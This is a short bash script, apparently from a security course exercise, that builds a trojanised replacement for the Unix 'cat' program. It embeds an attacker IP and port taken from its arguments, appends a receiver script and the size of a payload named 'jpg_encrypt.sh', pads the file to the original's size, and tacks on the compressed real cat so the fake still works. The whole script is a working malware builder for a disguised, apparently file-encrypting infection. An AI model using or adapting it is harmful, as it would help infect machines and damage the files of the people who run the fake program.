#!/bin/bash

gzip -fkc /home/csc2022/cat > ./cat.gz
rm -f cat_virus

echo "#!/bin/bash" >> cat_virus
catgzsize="`wc -c ./cat.gz | awk '{printf $1}'`"
echo "catgzsize=$catgzsize" >> cat_virus
echo "malwaresize=`wc -c ./jpg_encrypt.sh | awk '{printf $1}'`" >> cat_virus
echo "ip=\""$1"\"" >> cat_virus
echo "port=\""$2"\"" >> cat_virus
cat recv_virus.sh >> cat_virus
# zero padding
yes 0 | head -n "$((`wc -c ./cat | awk '{printf $1}'` - `wc -c ./cat_virus | awk '{printf $1}'` - $catgzsize - 4))" | tr -d '\n' >> cat_virus
# compressed original program
cat cat.gz >> cat_virus
# end bytes
echo -n -e \\xaf\\xbe\\xad\\xde >> cat_virus
